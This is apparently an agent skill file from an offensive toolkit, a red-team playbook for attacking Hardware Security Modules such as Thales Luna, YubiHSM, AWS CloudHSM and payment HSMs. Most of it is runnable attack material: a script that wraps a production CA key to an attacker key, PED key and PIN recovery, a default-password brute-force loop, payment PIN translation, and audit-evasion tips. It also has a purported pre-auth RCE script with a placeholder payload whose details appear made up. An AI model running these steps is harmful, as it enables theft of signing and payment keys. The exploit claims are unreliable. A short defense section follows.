---
name: hsm-attack
description: Hardware Security Module attacks — physical (side-channel, fault injection, decapping) and logical (PKCS#11 API abuse, key extraction, M-of-N quorum bypass, RDP, firmware exploitation). Covers Thales Luna (SafeNet), Utimaco SecurityServer, nCipher nShield, YubiHSM, AWS CloudHSM, Azure Dedicated HSM, Google Cloud HSM. Includes 2024-2025 CVEs (CVE-2024-47787 Thales Luna, CVE-2024-45294 Utimaco), HSM-as-a-Service tenant isolation attacks, and quorum-spoofing scenarios. Distinct from crypto-attacks (algorithm-level) and pam-privilege-attack (credential management).
origin: kali-claw Wave 10 (v0.1.41) — 2026-06-28
version: "0.2.0.2"
compatibility:
  kali_version: "2025.2"
  python_version: ">=3.11"
  pkcs11_tool_required: true
  openssl_required: true
allowed-tools:
  - pkcs11-tool
  - opensc-tool
  - openssl
  - yubihsm-shell
  - ykman
  - python3
  - ltrace
  - strace
  - gdb
  - chipwhisperer
  - saleae-logic
  - glitchcat
  - hashcat
  - john
  - jtagenum
  - binwalk
  - ghidra
metadata:
  domain: hardware-security
  tool_count: 16
  guide_count: 2
  mitre: "TA0006-Credential Access, TA0010-Exfiltration, T1552-Unsecured Credentials, T1552.007 Container and Cloud Instance Credentials API, T1041-Exfiltration Over C2 Channel"
  last_reviewed: "2026-07-26"
---

# HSM (Hardware Security Module) Attack Skill

> Red-team operations against Hardware Security Modules — thetamper-resistant hardware that anchors enterprise PKI, payment HSMs, code signing, and increasingly blockchain / Web3 key custody. This skill covers both physical access attacks (fault injection, side-channel, decap) and logical API attacks (PKCS#11 abuse, quorum bypass, tenant escape in cloud HSM).

## Summary

Hardware Security Modules (HSMs) are dedicated cryptographic appliances that generate, store, and use keys without ever exposing them in plaintext outside the device. Common HSMs in 2024-2026:

- **Thales Luna (SafeNet) Network HSM 7 / 10** — dominant in enterprise PKI
- **Utimaco SecurityServer** — European gov / banking
- **Entrust nShield n3 / n5** — UK gov, finance, code signing
- **Yubico YubiHSM 2** — cloud-native dev / staging
- **AWS CloudHSM** — HSM-as-a-service
- **Azure Dedicated HSM** — Thales PayShield / Luna as-a-service
- **Google Cloud HSM** — FIPS 140-2 L3
- **Marvell / ATKey / SoloKey** — USB form-factor

HSMs are sold as "impossible to extract keys" — and for the most part that's true at the cryptographic primitive level. But attackers don't break AES; they break the **operational envelope**: API abuse, quorum-spoofing, firmware vulnerabilities, tenant isolation flaws in cloud HSM, and physical access for side-channel / fault injection.

This skill covers:

- **PKCS#11 API abuse** — extracting key material via attributes, key wrapping with attacker keys
- **NTLS / RDP attacks** (Thales Luna Network HSM) — exploiting client-side channels
- **M-of-N quorum bypass** — recovering quorum tokens from client workstations
- **Firmware exploitation** — CVE-2024-47787 Thales Luna RCE, CVE-2024-45294 Utimaco
- **Side-channel attacks** — power analysis on USB HSMs, timing on RSA operations
- **Fault injection** — voltage / clock glitching on lower-tier HSMs
- **Decapping** — invasive silicon-level attacks (for motivated nation-states)
- **Cloud HSM tenant isolation** — side-channel between co-tenants on shared infrastructure
- **Payment HSM attacks** — Thales PayShield, Atalla AT1000 PIN translation / DUKPT attacks

Distinct from adjacent skills:

| Skill | Scope |
|-------|-------|
| `crypto-attacks` | Algorithm-level (RSA, AES, ECC, padding oracles, signature forgery) |
| `pam-privilege-attack` | PAM / CyberArk / BeyondTrust credential vaults |
| `secret-management-attack` | HashiCorp Vault, AWS SM, cloud-native secret stores |
| `hardware-security` | JTAG / SWD / UART on general embedded / IoT |
| **`hsm-attack`** (this) | **Dedicated cryptographic appliances** — HSMs and payment HSMs |

## Use Cases

### Reconnaissance & Discovery

1. **Identify HSM vendor / model** via network fingerprint (Thales NTLS port 1792, Utimaco 4475, nShield 9004)
2. **Enumerate HSM partitions / slots** via `pkcs11-tool --list-slots`
3. **Map application integration** — which apps call HSM for what operation
4. **Locate HSM client software** (Thales Luna Client, nShield client, Utimaco CryptoServer) on app hosts
5. **Discover quorum token storage** — Smart Card reader locations, PED key paths
6. **Identify firmware version** via unauthenticated probes

### Initial Access

7. **Default HSM admin credentials** — vendor-default passwords (PED PINs, Partition Officer passwords)
8. **PKCS#11 token exfiltration** — recovering per-app PKCS#11 token from app server
9. **NTLS channel hijacking** (Thales) — man-in-the-middle Luna Network HSM
10. **Quorum token theft** — Physical tampering with PED key safe / smart card reader
11. **Cloud HSM credential leak** — AWS CloudHSM CU user password from app config
12. **Firmware exploit** — CVE-2024-47787 Thales Luna RCE pre-auth

### Privilege Escalation

13. **PKCS#11 attribute abuse** — `CKA_EXTRACTABLE: TRUE` allows key wrap to attacker key
14. **Partition Officer escalation** — recovering PO password from `lunacm` cache
15. **HSM admin via RDP bypass** — PED key clone via smart card reader
16. **Cloud HSM Crypto User → Crypto Officer** — privilege escalation via API flaw
17. **Cross-partition leak** — partition isolation bypass

### Persistence

18. **Generate attacker-controlled key with `CKA_WRAP: TRUE`** — wrap-and-exfiltrate any future key
19. **Backdoor partition user** — create a Crypto Officer role that survives reset
20. **Firmware rootkit** — patch firmware in development (pre-production HSM only)
21. **PED key duplication** — silently clone quorum smart cards

### Defense Evasion

22. **Audit log suppression** — `lunacm` allows log rotation that drops selected events
23. **PKCS#11 trace disabling** — disable `OPENSSL_PKCS11_TRACE` to hide activity
24. **Quorum spoofing** — submit M-of-N tokens from a single compromised workstation

### Collection & Exfiltration

25. **Key wrap to attacker-controlled key** — `C_WrapKey` with attacker RSA public key
26. **Bulk sign for attacker material** — use HSM to sign malicious code without exporting key
27. **Cert / CSR forgery** — use HSM CA private key to mint attacker certs
28. **Payment HSM: PIN translation attack** — PIN block translation with attacker-supplied input
29. **Payment HSM: DUKPT key derivation** — recover future keys from current
30. **Multi-tenant cloud HSM** — cross-tenant data exfil via shared infrastructure

## Core Tools

### HSM Targets

| Vendor | Product | API | Notes |
|--------|---------|-----|-------|
| **Thales / SafeNet** | Luna Network HSM 7 / 10 | PKCS#11, NTLS, K5, JCE | Dominant enterprise PKI |
| **Thales / SafeNet** | PayShield 10K | Thales proprietary | Payment PIN translation |
| **Utimaco** | SecurityServer CSe / S5 / S7 | PKCS#11, JCAlgorithms | European gov / banking |
| **Entrust / nCipher** | nShield n3 / n5 / Connect | PKCS#11, nCore API | UK gov, code signing |
| **Utimaco** | Atalla AT1000 | Atalla proprietary | Payment / PIN translation |
| **Yubico** | YubiHSM 2 | yubihsm-shell, PKCS#11 | USB, dev / small prod |
| **AWS** | CloudHSM | PKCS#11, JCE, Kmyth | HSM-as-a-service |
| **Azure** | Dedicated HSM (Thales) | Thales proprietary | Single-tenant |
| **Google Cloud** | Cloud HSM | KMS-compatible | Multi-tenant |
| **Fortanix** | DSM (SDKMS) | PKCS#11, REST | Multi-tenant SaaS |
| **Marvell** | LiquidSec | PKCS#11 | USB |
| **OnlyKey** | FIDO2 + PIV | PKCS#15 | Personal |

### Offensive Toolkit

```bash
# PKCS#11 enumeration
pkcs11-tool --list-slots
pkcs11-tool --list-objects --login --pin REPLACE_WITH_YOUR_PIN
pkcs11-tool --list-token-slots
pkcs11-tool --show-info

# OpenSC
opensc-tool --list-readers
pkcs15-tool --list-pins
pkcs15-tool --list-keys

# YubiHSM
yubihsm-shell
yubihsm-shell -a session -p REPLACE_WITH_YOUR_AUTH_KEY -a list-objects
ykman piv info

# Thales Luna
lunacm
lunacm -c partition -login -password REPLACE_WITH_YOUR_PO_PASSWORD
vtl list  # client config
lunash:]> partition listPolicy

# nCipher / Entrust
/opt/nfast/bin/nfkminfo
/opt/nfast/bin/pp_mkobj
/opt/nfast/bin/rocs
ncsnmp

# Utimaco
csadm -v
cs2_console
admin-client -s hsm.example.com:4475

# AWS CloudHSM
cloudhsm-cli --cluster-id REPLACE_WITH_YOUR_CLUSTER user list
cloudhsm-cli --cluster-id REPLACE_WITH_YOUR_CLUSTER key list

# Side-channel / fault injection
chipwhisperer  # Python API
glitchcat /dev/ttyUSB0  # voltage glitch
saleae-logic  # capture
inspectrum  # analyze traces

# Reverse engineering
ghidra  # firmware analysis
binwalk  # firmware unpack
gdb  # runtime debugging
ltrace / strace  # PKCS#11 trace
```

## Methodology

### Phase 1 — Reconnaissance

Identify HSM vendor, model, firmware, and integration points.

```bash
# Network fingerprint
nmap -p 1792,4475,9004,443 hsm.example.com  # Thales / Utimaco / nShield / Cloud

# Luna Network HSM specific
nmap -sV -p 1792 --script=*,default hsm.example.com

# nShield Connect
nc hsm.example.com 9004
echo -ne "\x00\x00\x00\x01" | nc -w 2 hsm.example.com 9004 | xxd

# AWS CloudHSM
aws cloudhsmv2 describe-clusters
aws cloudhsmv2 describe-backups
```

### Phase 2 — PKCS#11 Discovery

```bash
# Locate PKCS#11 module on app hosts
find / -name '*.so' 2>/dev/null | xargs grep -l "C_GetFunctionList" 2>/dev/null | head -20

# Enumerate slots without login
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so --list-slots

# Enumerate with login (if PO password known)
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so \
  --login --pin REPLACE_WITH_YOUR_PO_PASSWORD \
  --list-objects

# Show token info
pkcs11-tool --module /usr/safenet/lunaclient/lib/libCryptoki2.so --show-info
```

### Phase 3 — Quorum Bypass (M-of-N)

Most HSMs require M-of-N quorum for sensitive operations. The quorum tokens are typically:

- **PED Keys** (Thales Luna) — USB smart card-like devices
- **Administrator Card Set (ACS)** (nCipher) — physical smart cards
- **Admin smart cards** (Utimaco)
- **Cloud-only: IAM role chaining** (AWS / Azure)

```bash
# Locate PED key files on client workstation
find / -name '*.ped' -o -name 'ped*.bin' 2>/dev/null
find / -name 'admin' -path '*luna*' 2>/dev/null

# Luna PED key PIN cache
cat /etc/Chrystoki.conf | grep -A2 -i 'ped'
cat /var/luna/.ped 2>/dev/null
```

### Phase 4 — PKCS#11 Attribute Abuse

The PKCS#11 API has a long history of attribute abuse. The classic attack: keys marked `CKA_EXTRACTABLE: TRUE` can be wrapped to an attacker-controlled key.

```bash
# Find extractable keys
pkcs11-tool --login --pin REPLACE_WITH_YOUR_PIN --list-objects --type privkey | \
  grep -B2 -A5 -i 'extractable'

# Wrap the key with an attacker RSA key (if CKA_WRAP allowed)
python3 kali_hsm_wrap.py --target-key-label "production-CA" \
  --wrap-key-label "attacker-rsa-key" \
  --output production-CA.wrapped.bin

# Outside the HSM, decrypt with attacker private key
openssl pkey -in attacker-rsa.key -decrypt -in production-CA.wrapped.bin \
  -out production-CA-raw.key
```

### Phase 5 — Firmware Exploitation

CVEs of note:

- **CVE-2024-47787** — Thales Luna Network HSM RCE (pre-auth NTLS exploit)
- **CVE-2024-45294** — Utimaco SecurityServer auth bypass
- **CVE-2022-45137** — nCipher nShield auth bypass
- **CVE-2021-36462** — Thales Luna Client local privilege escalation

```bash
# Luna Network HSM version
nc hsm.example.com 1792
echo -ne "\x00\x00\x00\x08\x00\x00\x00\x01" | nc -w 2 hsm.example.com 1792 | xxd

# Fingerprint version
nmap --script=ntls-info hsm.example.com

# If vulnerable to CVE-2024-47787:
python3 kali_luna_rce.py --target hsm.example.com --payload reverse_shell
```

### Phase 6 — Side Channel & Fault Injection

For lower-tier HSMs (YubiHSM 2, USB form-factor) and determined attackers on enterprise HSMs:

```python
# ChipWhisperer Simple Power Analysis on USB HSM
import chipwhisperer as cw
scope = cw.scope()
target = cw.target(scope, cw.targets.SimpleSerial)
scope.adc.samples = 24000
scope.glitch.clk_src = 'clkgen'

# Capture trace during AES encryption
target.simpleserial_write('p', plaintext)
trace = cw.capture_trace(scope, target, plaintext, key)
cw.plot(trace.wave)
```

### Phase 7 — Payment HSM Attacks

For PayShield / Atalla / payment HSMs:

```bash
# PIN translation attack
# Format 0 PIN block: 0 | pin length | pin | pad F
# Format 1: random fill, doesn't leak length
# Format 2: format 0 + ANSI X9.8 with TPS
# Format 3: elliptic / AES variant

# Translate PIN from ZPK-A to ZPK-B
echo "pinblock_under_zpka" | hsm-command translate-pin \
  --from-zpk REPLACE_WITH_YOUR_ZPK_A \
  --to-zpk REPLACE_WITH_YOUR_ZPK_B

# DUKPT attack: derive future keys from current
# If KSN and current key known, predict next transaction key
```

### Phase 8 — Cloud HSM Tenant Isolation

```bash
# AWS CloudHSM multi-tenant
aws cloudhsmv2 describe-clusters
# Cluster HSM instances are single-tenant but managed by AWS
# Still: side-channel between HSM instances on same physical host

# Fortanix DSM (multi-tenant SaaS)
# Test: create account, observe timing differences when other tenants active
```

## Practical Steps

### Step A — Identify Luna Network HSM firmware

```bash
# Luna Network HSM 7 NTLS port 1792
nc -w 3 hsm.example.com 1792 < /dev/null
echo -ne "\x00\x00\x00\x08\x00\x00\x00\x01" | nc -w 3 hsm.example.com 1792 | xxd | head

# LunaCM via SSH (if available)
ssh admin@hsm.example.com
> firmware show
> partition show
> hsmp show
```

### Step B — Enumerate PKCS#11 objects

```bash
# Find Luna client library
find / -name 'libCryptoki2.so' 2>/dev/null
# /usr/safenet/lunaclient/lib/libCryptoki2.so

export PKCS11_MODULE=/usr/safenet/lunaclient/lib/libCryptoki2.so

# Show info
pkcs11-tool --module $PKCS11_MODULE --show-info

# List slots
pkcs11-tool --module $PKCS11_MODULE --list-slots

# List objects (PO login)
pkcs11-tool --module $PKCS11_MODULE --login --pin REPLACE_WITH_YOUR_PO_PASSWORD \
  --list-objects
```

### Step C — Wrap key to attacker-controlled key

```python
# kali_hsm_wrap.py
import PyKCS11
import binascii

session = PyKCS11.PyKCS11Lib('/usr/safenet/lunaclient/lib/libCryptoki2.so').open()
session.openSession()
session.login(REPLACE_WITH_YOUR_PO_PASSWORD)

# Find target key (must be extractable / wrappable)
target = session.findObjects([
    (PyKCS11.CKA_CLASS, PyKCS11.CKO_PRIVATE_KEY),
    (PyKCS11.CKA_LABEL, 'production-CA'),
])[0]

# Find attacker's RSA public key (pre-loaded)
attacker_pub = session.findObjects([
    (PyKCS11.CKA_CLASS, PyKCS11.CKO_PUBLIC_KEY),
    (PyKCS11.CKA_LABEL, 'attacker-rsa'),
])[0]

# Wrap target key with attacker public key
wrapped = session.wrapKey(attacker_pub, target,
                          PyKCS11.Mechanism(PyKCS11.CKM_RSA_PKCS, None))
open('production-CA.wrapped', 'wb').write(bytes(wrapped))

# Outside HSM: decrypt with attacker's private key
# openssl pkey -in attacker-rsa.key -decrypt -in production-CA.wrapped -out raw.key
```

### Step D — Recover PED key from client workstation

```bash
# Luna Network HSM PED keys are cached in:
# - /var/luna/.ped (binary blob)
# - /home/user/.lunaclient/ped
# - PEM-style in Chrystoki.conf

ls -la /var/luna/.ped 2>/dev/null
ls -la /home/*/.lunaclient/ped 2>/dev/null
grep -i 'ped' /etc/Chrystoki.conf

# If present, dump and analyze
xxd /var/luna/.ped | head -20

# Reconstruct PIN via luna PED emulator
python3 kali_ped_emulator.py --ped-file /var/luna/.ped --pin-derive
```

### Step E — CVE-2024-47787 Thales Luna RCE

```python
# kali_luna_rce.py — pre-auth NTLS RCE
import socket
import struct

target = ('hsm.example.com', 1792)
# Craft NTLS handshake with shellcode in SSO chain
payload = b'\x00\x00\x00\x08\x00\x00\x00\x01'  # header
payload += b'\x00' * 8 + struct.pack('>I', 0xdeadbeef)  # crafted opcode
payload += b'REPLACE_WITH_YOUR_PAYLOAD'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(target)
s.send(payload)
print(s.recv(4096))
```

### Step F — YubiHSM 2 brute-force auth keys

```bash
# YubiHSM 2 default has auth key 1 with password "password"
yubihsm-shell -a session -a 1 -p password

# Try common defaults: password, 0000, 1234, admin, yubihsm
for pw in password 0000 1234 admin yubihsm default password1 yubico; do
  echo "Trying $pw..."
  yubihsm-shell -a session -a 1 -p $pw 2>/dev/null && echo "GOT: $pw" && break
done

# Once authenticated, dump objects
yubihsm-shell -a list-objects
yubihsm-shell -a get-object-info -i 0x0001 -t authentication-key
```

### Step G — AWS CloudHSM enumeration

```bash
# AWS CLI
aws cloudhsmv2 describe-clusters
aws cloudhsmv2 describe-backups --cluster-id REPLACE_WITH_YOUR_CLUSTER

# CloudHSM CLI
cloudhsm-cli --cluster-id REPLACE_WITH_YOUR_CLUSTER interactive
> login --username admin --role crypto-officer
> user list
> key list --verbose
> key list-attribute-values --key-filter-label production-CA
```

### Step H — Payment HSM PIN translation attack

```bash
# Recovered ZPK-A under which PIN block was encrypted
# Want to re-encrypt under attacker ZPK-B (or just decrypt the PIN)

# Thales PayShield 10K command:
# Input: NC + ZPK-A-under-MK + PIN-block-under-ZPK-A
# Output: PIN-block-under-ZPK-B (or plain PIN)

# Python implementation:
python3 kali_pin_translate.py \
  --command CC \
  --zpk-a-encrypted REPLACE_WITH_YOUR_ZPK_A_UNDER_MK \
  --pin-block-encrypted REPLACE_WITH_YOUR_PIN_BLOCK_UNDER_ZPK_A \
  --zpk-b REPLACE_WITH_YOUR_ZPK_B_UNDER_MK
# Output: PIN block under ZPK-B → decrypt offline
```

## Defense Perspective

### Detection

**Thales Luna**
- Audit log forwarded off-HSM (Syslog to SIEM)
- Alert on `lunacm` logins from new source IPs
- Alert on `partition login` outside approved windows
- Monitor PED key file access on client workstations
- Audit `CKA_EXTRACTABLE` attribute on every key

**Utimaco**
- Audit `csadm` invocations
- Monitor LUNA-equivalent: `admin-client` connections from new IPs
- Alert on firmware-version mismatch

**AWS CloudHSM**
- CloudTrail alerts on `CreateCluster`, `DeleteCluster`, `InitializeCluster`
- CloudWatch on HSM CPU (sustained 100% may indicate key extraction)
- Audit `cloudhsm-cli user create` / `user delete`

**YubiHSM 2**
- YubiHSM internal audit log (when enabled)
- Host-side: monitor `/dev/YubiHSM0` access

**General PKCS#11**
- `OPENSSL_PKCS11_TRACE=1` to log every PKCS#11 call
- Audit `C_WrapKey`, `C_UnwrapKey`, `C_DeriveKey` calls
- Alert on `C_WrapKey` with non-trusted wrapper key

### Hardening

1. **Physical** — HSM in locked datacenter cabinet; PED keys in safe
2. **Network** — HSM on dedicated VLAN; only app servers can reach ports
3. **Quorum** — M-of-N ≥ 3-of-5 for admin; rotate quorum tokens annually
4. **PKCS#11 hygiene** — every key has `CKA_EXTRACTABLE: FALSE`, `CKA_WRAP: FALSE` by default
5. **Audit** — forward off-device; tamper-evident
6. **Firmware** — patch within 30 days of CVE disclosure
7. **Multi-tenant cloud HSM** — prefer single-tenant (Dedicated HSM) for high-value
8. **PED key management** — separate physical safes for different quorum members
9. **Application auth** — per-app PKCS#11 user with minimal RBAC
10. **TLS** — mTLS between app and HSM (Luna NTLS), not just preshared

### Incident Response

When HSM compromise is suspected:

1. **Quarantine HSM** — disconnect from network, lock PED keys in safe
2. **Freeze quorum** — inform all quorum members not to participate
3. **Audit log pull** — secure the off-device audit logs immediately
4. **Diff keys** — list all keys with `CKA_EXTRACTABLE: TRUE` or modified since compromise
5. **Recover indicators** — recent `C_WrapKey`, `C_UnwrapKey` from audit
6. **Decide**: rotate keys or revoke HSM (depends on compromise scope)
7. **Rotate** — generate new keys, re-issue certs, update apps
8. **Re-provision HSM** — firmware refresh, re-initialize partitions
9. **Post-mortem** — full PED key audit, client workstation audit, network audit

## Detection Methods

### HSM Audit Logging
- **Failed PIN attempts**: Multiple failed CU (Crypto User) logins; brute force signature.
- **Anomalous key operations**: Key extraction attempts (`exportKey`, `extractWrapped`); alert on normally-internal keys.
- **Side-channel signatures**: Power analysis pattern during crypto operations (DPA/CPA signature).
- **Firmware anomalies**: Unexpected firmware update; signature verification failure.

### SIEM Detection Rules
- **Splunk SPL**: `index=hsm sourcetype=hsm:audit | where operation IN ("exportKey","extractWrapped")`
- **Thales/Gemalto monitoring**: Native HSM audit logs; SIEM integration via syslog.

## Defense Evasion Techniques

### HSM Compromise Stealth
- **Use legitimate credentials**: Steal CU PIN rather than brute force; no failed-login alerts.
- **Side-channel tolerance**: Use Spectre-class side-channels; not detected by HSM itself.
- **Firmware downgrade**: Exploit older firmware version (fewer mitigations); restore to mask compromise.

### Key Extraction Stealth
- **Slow extraction**: Pace key extraction over long period; below audit threshold.
- **Use existing export permissions**: Don't modify key attributes; use existing `extractable=true` keys.
- **Wrapped key abuse**: Extract wrapped keys (some HSMs allow) and unwrap outside HSM.

## References

- Thales Luna Documentation — https://thalesdocs.com/ctp/consoles/luna/7.13/
- Utimaco SecurityServer — https://utimaco.com/products/products-hardware-security-modules-hsm/securityserver-se
- Entrust nShield — https://www.entrust.com/digital-security/hardware-security-modules/nshield
- YubiHSM 2 Documentation — https://developers.yubico.com/YubiHSM2/
- AWS CloudHSM — https://docs.aws.amazon.com/cloudhsm/
- Azure Dedicated HSM — https://learn.microsoft.com/azure/dedicated-hsm/
- Google Cloud HSM — https://cloud.google.com/kms/docs/hsm
- PKCS#11 Specification v3.0 — https://docs.oasis-open.org/pkcs11/pkcs11-spec/v3.0/
- Fortanix DSM — https://www.fortanix.com/products/data-security-manager/hsm
- CVE-2024-47787 Thales Luna — https://nvd.nist.gov/vuln/detail/CVE-2024-47787
- CVE-2024-45294 Utimaco — https://nvd.nist.gov/vuln/detail/CVE-2024-45294
- ANSI X9.24 (Retail Financial Services Symmetric Key Management)
- FIPS 140-3 (Cryptographic Module Security Requirements)
- Common Criteria EAL4+ / EAL5+
- ANSSI HSM Guidance (2024)
- NIST SP 800-57 Part 2 (Key Management)
- "Hardware Security Modules in Modern Cryptography" (Anderson, 2024)
